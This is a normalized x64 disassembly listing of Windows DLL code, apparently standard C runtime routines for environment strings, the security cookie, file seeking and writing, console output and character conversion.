jmp r-xdata
cmp [ rax ] r12b
je r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
sub rdi rbx
sar rdi 0x1
mov r8 rbx
xor edx edx
lea r9d [ rdi + 0x1 ]
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
movsxd rbp eax
cmp ebp r12d
je r-xdata
add rdi rsi
cmp [ rdi ] r12w
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub eax ebx
inc eax
movsxd rsi eax
mov rcx rsi
call sub_1800114a4
mov rdi rax
cmp rax r12
jne r-xdata
inc rax
cmp [ rax ] r12b
jne r-xdata
mov rsi r12
mov rcx rbp
call sub_1800114a4
mov rsi rax
cmp rax r12
je r-xdata
add rdi rsi
cmp [ rdi ] r12w
jne r-xdata
mov r8 rsi
mov rdx rbx
mov rcx rax
call sub_1800160e0
mov rcx rbx
call [ FreeEnvironmentStringsA@IAT ]
mov rax rdi
mov rcx rbx
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc rax
cmp [ rax ] r12b
jne r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
lea r9d [ rdi + 0x1 ]
mov r8 rbx
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
cmp eax r12d
jne r-xdata
mov rcx rbx
call [ FreeEnvironmentStringsW@IAT ]
mov rax rsi
jmp r-xdata
mov rcx rsi
call sub_18000e06c
sub_1800183cc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_180018404
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_18001843c
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_1800184f0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_18001bf94
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
mov [ rsp + 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_180010834
mov [ rax ] 0x9
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx eax
call sub_180010874
jmp r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
sub_180018588
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r12d r8d
mov r13 rdx
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
xor edi edi
cmp ebx edi
jl r-xdata
call sub_180010854
xor edi edi
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
or rax 0xffffffffffffffff
jmp r-xdata
call sub_180010854
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or rax 0xffffffffffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rsi rbx
mov r14 rbx
sar r14 0x5
lea r15 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + rsi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_18001c018
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + rsi + 0x8 ] 0x1
je r-xdata
call sub_180010854
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or rax 0xffffffffffffffff
jmp r-xdata
call sub_180010834
mov [ rax ] 0x9
call sub_180010854
mov [ rax ] edi
or rdi 0xffffffffffffffff
mov r8d r12d
mov rdx r13
mov ecx ebx
call sub_1800184f0
mov rdi rax
jmp r-xdata
mov ecx ebx
call sub_18001c0c0
mov rax rdi
jmp r-xdata
sub_1800186c0
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov eax 0x1b30
call sub_1800232c0
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1b20 ] rax
xor ebp ebp
xor edi edi
mov r13d r8d
mov r12 rdx
movsxd rbx ecx
mov [ rsp + 0x40 ] ebp
test r8d r8d
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov r15 rbx
mov r14 rbx
lea rax [ rw-data ]
sar r14 0x5
and r15d 0x1f
mov rcx [ rax + r14 * 8 ]
mov [ rsp + 0x50 ] r14
imul r15 r15 0x58
mov sil [ r15 + rcx + 0x38 ]
add sil sil
sar sil 0x1
cmp sil 0x2
je r-xdata
call sub_180010854
and [ rax ] edi
call sub_180010834
and [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
mov rcx [ rsp + 0x1b20 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x1b88 ]
add rsp 0x1b30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r13d
not eax
test al 0x1
je r-xdata
cmp sil 0x1
jne r-xdata
test [ r15 + rcx + 0x8 ] 0x20
je r-xdata
mov ecx ebx
call sub_180018fa8
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_1800184f0
lea rax [ rw-data ]
mov rcx [ rax + r14 * 8 ]
test [ r15 + rcx + 0x8 ] 0x80
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r14 * 8 ]
test [ r15 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ r15 + rcx ]
and [ rsp + 0x20 ] rdi
lea r9 [ rsp + 0x48 ]
mov r8d r13d
mov rdx r12
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov rbp r12
test sil sil
jne r-xdata
call sub_180010a54
xor ebx ebx
lea rdx [ rsp + 0x58 ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r14 * 8 ]
mov rcx [ r15 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov edi [ rsp + 0x48 ]
xor ebx ebx
jmp r-xdata
cmp sil 0x2
jne r-xdata
test r13d r13d
je r-xdata
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
test r13d r13d
je r-xdata
test r13d r13d
je r-xdata
mov rax [ rax + r14 * 8 ]
test [ r15 + rax + 0x8 ] 0x40
je r-xdata
lea edx [ rbx + 0xd ]
call [ GetConsoleCP@IAT ]
and [ rsp + 0x4c ] edi
mov rbx r12
mov [ rsp + 0x58 ] eax
test r13d r13d
je r-xdata
test sil sil
je r-xdata
sub edi ebp
mov eax edi
test ebx ebx
je r-xdata
mov r8d 0xd
mov edx 0xd
call sub_180010834
mov [ rax ] 0x1c
call sub_180010854
and [ rax ] 0x0
jmp r-xdata
cmp [ r12 ] 0x1a
je r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rsp + 0x720 ]
mov r8d esi
sub r8d eax
lea rax [ rw-data ]
mov [ rsp + 0x40 ] r14d
mov r14 [ rsp + 0x50 ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x720 ]
mov rcx [ rax + r14 * 8 ]
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ rbp ]
inc rbp
cmp al 0xa
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
mov r14d [ rsp + 0x58 ]
mov ebp 0xd
lea rax [ rw-data ]
cmp ebx 0x5
jne r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x70 ]
sub ecx eax
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] 0xd55
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rsp + 0x720 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r14d eax
test eax eax
je r-xdata
movzx eax [ rbp ]
add rbp 0x2
cmp ax 0xa
jne r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rsp + 0x720 ]
mov r8d esi
sub r8d eax
lea rax [ rw-data ]
mov [ rsp + 0x40 ] r14d
mov r14 [ rsp + 0x50 ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x720 ]
mov rcx [ rax + r14 * 8 ]
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ rbp ]
add rbp 0x2
cmp ax 0xa
jne r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
add edi [ rsp + 0x48 ]
lea rax [ rsp + 0x720 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
inc rcx
mov [ rsi ] al
inc rsi
cmp rcx 0x13ff
jb r-xdata
mov [ rsi ] dl
inc r14d
inc rsi
inc rcx
cmp sil 0x1
je r-xdata
mov rdx [ rsp + 0x50 ]
mov cl [ rbx ]
xor r14d r14d
cmp cl 0xa
lea rbp [ rw-data ]
mov rdx [ rbp + rdx * 8 ]
sete r14b
cmp [ r15 + rdx + 0x50 ] 0x0
je r-xdata
mov ecx ebx
call sub_180010874
jmp r-xdata
call sub_180010834
mov [ rax ] 0x9
call sub_180010854
mov [ rax ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
xor esi esi
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x6a8
jb r-xdata
mov [ rcx ] r8w
add rcx 0x2
add rdx 0x2
add edi [ rsp + 0x48 ]
lea rax [ rsp + 0x720 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
add rcx 0x2
mov [ rsi ] ax
add rsi 0x2
cmp rcx 0x13fe
jb r-xdata
mov [ rsi ] dx
add r14d 0x2
add rsi 0x2
add rcx 0x2
mov ebp [ rsp + 0x40 ]
mov eax ebp
mov edx 0xd
sub eax r12d
cmp eax r13d
jb r-xdata
mov eax ebp
sub eax r12d
cmp eax r13d
jae r-xdata
movzx eax [ rbx ]
xor r14d r14d
cmp ax 0xa
mov [ rsp + 0x44 ] ax
sete r14b
add rbx 0x2
cmp sil 0x2
jne r-xdata
movsx ecx cl
call sub_180019670
test eax eax
je r-xdata
mov al [ r15 + rdx + 0x4c ]
mov [ rsp + 0x5d ] cl
mov r8d 0x2
mov [ rsp + 0x5c ] al
and [ r15 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x5c ]
jmp r-xdata
mov r14 [ rsp + 0x50 ]
call [ GetLastError@IAT ]
mov ebx eax
add esi [ rsp + 0x48 ]
cmp r14d esi
jg r-xdata
mov eax ebp
sub eax r12d
cmp eax r13d
jae r-xdata
mov eax ebp
mov edx 0xd
sub eax r12d
cmp eax r13d
jb r-xdata
mov eax ebp
sub eax r12d
cmp eax r13d
jae r-xdata
mov r14d [ rsp + 0x40 ]
lea rsi [ rsp + 0x720 ]
xor ecx ecx
jmp r-xdata
movzx ecx [ rsp + 0x44 ]
call sub_18001c0e8
cmp ax [ rsp + 0x44 ]
jne r-xdata
cmp sil 0x2
jne r-xdata
cmp sil 0x1
je r-xdata
mov r8d 0x1
mov rdx rbx
mov rax r13
sub rax rbx
add rax r12
cmp rax 0x1
jle r-xdata
lea rcx [ rsp + 0x44 ]
call sub_180019620
cmp eax 0xffffffff
je r-xdata
mov edi ebp
mov r8d 0xd
sub edi r12d
cmp edi r13d
jb r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
movsxd rcx esi
lea rdx [ rsp + rcx + 0x720 ]
mov r8d r14d
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
lea r9 [ rsp + 0x48 ]
sub r8d esi
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov r14d [ rsp + 0x40 ]
lea rsi [ rsp + 0x720 ]
xor ecx ecx
jmp r-xdata
add edi 0x2
test r14d r14d
je r-xdata
mov eax ebx
sub eax r12d
cmp eax r13d
jb r-xdata
mov ebx [ rsp + 0x4c ]
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx [ rsp + 0x58 ]
lea rax [ rsp + 0x5c ]
lea r8 [ rsp + 0x44 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
inc rbx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov ebp eax
test eax eax
je r-xdata
mov al [ rbx ]
mov r14 [ rsp + 0x50 ]
inc edi
mov rcx [ rbp + r14 * 8 ]
mov [ r15 + rcx + 0x4c ] al
mov rax [ rbp + r14 * 8 ]
mov [ r15 + rax + 0x50 ] 0x1
mov ebx [ rsp + 0x4c ]
jmp r-xdata
lea rcx [ rsp + 0x44 ]
mov r8d 0x2
mov rdx rbx
call sub_180019620
cmp eax 0xffffffff
je r-xdata
lea rcx [ rsp + 0x70 ]
xor edx edx
jmp r-xdata
cmp r14d esi
jg r-xdata
mov ecx ebp
mov [ rsp + 0x44 ] bp
call sub_18001c0e8
cmp ax [ rsp + 0x44 ]
jne r-xdata
test sil sil
jne r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
lea r9 [ rsp + 0x4c ]
lea rdx [ rsp + 0x5c ]
mov rcx [ r15 + rcx ]
mov r8d ebp
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc rbx
jmp r-xdata
inc edi
inc [ rsp + 0x40 ]
mov edi ebx
sub edi r12d
add edi [ rsp + 0x40 ]
cmp [ rsp + 0x4c ] ebp
jl r-xdata
mov ebp 0xd
test r14d r14d
je r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
mov [ rsp + 0x5c ] bpl
lea rcx [ rw-data ]
lea r9 [ rsp + 0x4c ]
lea r8d [ rbp - 0xc ]
mov rcx [ rcx + rax * 8 ]
lea rdx [ rsp + 0x5c ]
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x4c ] 0x1
jl r-xdata
inc [ rsp + 0x40 ]
inc edi
jmp r-xdata
sub_180018e20
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r12d r8d
mov r13 rdx
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
xor edi edi
cmp ebx edi
jl r-xdata
call sub_180010854
xor edi edi
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_180010854
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rsi rbx
mov r14 rbx
sar r14 0x5
lea r15 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + rsi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_18001c018
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + rsi + 0x8 ] 0x1
je r-xdata
call sub_180010854
mov [ rax ] edi
call sub_180010834
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180010764
or eax 0xffffffff
jmp r-xdata
call sub_180010834
mov [ rax ] 0x9
call sub_180010854
mov [ rax ] edi
or edi 0xffffffff
mov r8d r12d
mov rdx r13
mov ecx ebx
call sub_1800186c0
mov edi eax
jmp r-xdata
mov ecx ebx
call sub_18001c0c0
mov eax edi
jmp r-xdata
sub_180018f54
push rbx
sub rsp 0x20
inc [ rw-data ]
mov rbx rcx
mov ecx 0x1000
call sub_1800114a4
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
or [ rbx + 0x18 ] 0x4
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x24 ] 0x2
mov [ rbx + 0x10 ] rax
or [ rbx + 0x18 ] 0x8
mov [ rbx + 0x24 ] 0x1000
jmp r-xdata
mov rax [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
sub_180018fa8
sub rsp 0x38
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180010834
mov [ rax ] 0x9
jmp r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x9
call sub_180010764
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
movsxd rcx ecx
lea rdx [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
movsx eax [ rax + rcx + 0x8 ]
and eax 0x40
jmp r-xdata
add rsp 0x38
retn
sub_180019020
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor ecx ecx
lea rdx [ rw-data ]
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_180011510
mov [ rw-data ] rax
test rax rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_180011510
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor r8d r8d
lea rdx [ rw-data ]
lea r9d [ r8 + 0x3 ]
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
jmp r-xdata
mov [ rdx ] 0xfffffffe
cmp r10 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rdx 0x30
add rcx 0x8
sub rbx 0x1
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r8
lea r10 [ rw-data ]
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r10 + rax * 8 ]
imul rcx rcx 0x58
mov r10 [ rcx + rax ]
cmp r10 0xffffffffffffffff
je r-xdata
xor eax eax
test r10 r10
jne r-xdata
inc r8
add rdx 0x30
sub r9 0x1
jne r-xdata
sub_18001912c
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
call [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_180016624
bts [ rbx + 0x18 ] 0xf
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18001918c
push rbx
sub rsp 0x20
cmp ecx 0x14
mov rbx rdx
jge r-xdata
lea rcx [ rdx + 0x30 ]
call [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_180016624
bts [ rbx + 0x18 ] 0xf
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_1800191bc
sub rsp 0x28
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
call [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
btr [ rcx + 0x18 ] 0xf
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_180016524
jmp r-xdata
add rsp 0x28
retn
sub_18001923c
sub rsp 0x38
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x1c ]
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or eax 0xffffffff
jmp r-xdata
add rsp 0x38
retn
sub_180019274
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
test [ rdx + 0x18 ] 0x40
mov rdi rdx
movzx esi cx
jne r-xdata
add [ rdi + 0x8 ] 0xfffffffe
js r-xdata
mov rcx rdx
call sub_18001923c
lea rbp [ rw-data ]
lea r12 [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov rdx rdi
movzx ecx si
call sub_18001c470
mov rax [ rdi ]
mov [ rax ] si
mov r11 rbp
mov rcx rdi
call sub_18001923c
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x70 ]
mov rbp [ rsp + 0x78 ]
add rsp 0x40
pop r12
pop rdi
pop rsi
retn
add [ rdi + 0x8 ] 0xfffffffe
js r-xdata
mov rcx rdi
call sub_18001923c
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_18001923c
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18001923c
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
mov rcx [ rdi ]
mov [ rcx ] si
jmp r-xdata
mov r11 rbp
mov rcx rdi
call sub_18001923c
cmp eax 0xfffffffe
je r-xdata
mov al [ r11 + 0x38 ]
and al 0x7f
cmp al 0x2
je r-xdata
add [ rdi ] 0x2
mov ax si
jmp r-xdata
mov rcx rdi
call sub_18001923c
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_18001923c
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18001923c
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
test [ rbp + 0x8 ] 0x80
je r-xdata
mov rcx rdi
call sub_18001923c
cmp eax 0xfffffffe
je r-xdata
mov al [ r11 + 0x38 ]
and al 0x7f
cmp al 0x1
je r-xdata
lea rdx [ rsp + 0x24 ]
lea rcx [ rsp + 0x20 ]
movzx r9d si
mov r8d 0x5
call sub_18001a9dc
xor ebx ebx
cmp eax ebx
je r-xdata
mov rcx rdi
call sub_18001923c
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18001923c
mov ebp eax
and ebp 0x1f
imul rbp rbp 0x58
add rbp [ r12 + rbx * 8 ]
cmp [ rsp + 0x20 ] ebx
jle r-xdata
mov eax 0xffff
jmp r-xdata
mov ax si
jmp r-xdata
lea rbp [ rsp + 0x24 ]
movsx ecx [ rbp ]
mov rdx rdi
call sub_18000f884
mov ecx eax
mov rcx [ rdi ]
mov al [ rbp ]
mov [ rcx ] al
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
inc ebx
inc rbp
cmp ebx [ rsp + 0x20 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
add [ rdi + 0x8 ] 0xffffffff
js r-xdata
sub_18001945c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call __imp_EncodePointer
mov [ rbx ] rax
add rbx 0x8
sub rdi 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800194ac
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x50
xor ebp ebp
mov rsi r8
mov rdi rdx
mov rbx rcx
cmp rdx rbp
je r-xdata
xor eax eax
cmp r8 rbp
je r-xdata
cmp [ rdx ] bpl
jne r-xdata
lea rcx [ rsp + 0x30 ]
mov rdx r9
call sub_18000d428
mov r11 [ rsp + 0x30 ]
cmp [ r11 + 0x14 ] ebp
jne r-xdata
cmp rcx rbp
je r-xdata
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
call sub_180019628
cmp eax ebp
je r-xdata
cmp rbx rbp
je r-xdata
mov [ rcx ] bp
mov eax ebp
mov r9d 0x1
cmp rbx rbp
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebp
jne r-xdata
mov rcx [ rsp + 0x30 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rsp + 0x48 ] bpl
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
jmp r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_180010834
mov [ rax ] 0x2a
cmp [ rsp + 0x48 ] bpl
je r-xdata
cmp [ rdi + 0x1 ] bpl
je r-xdata
mov ecx [ rcx + 0x4 ]
mov eax ebp
cmp rbx rbp
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov rcx [ rsp + 0x30 ]
cmp eax ebp
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
or eax 0xffffffff
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov eax [ rcx + 0x10c ]
cmp [ rsp + 0x48 ] bpl
je r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180019628
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_18000d428
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180019670
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18000d428
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800197c4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov ebx ecx
xor edi edi
mov [ rsp + 0x70 ] edi
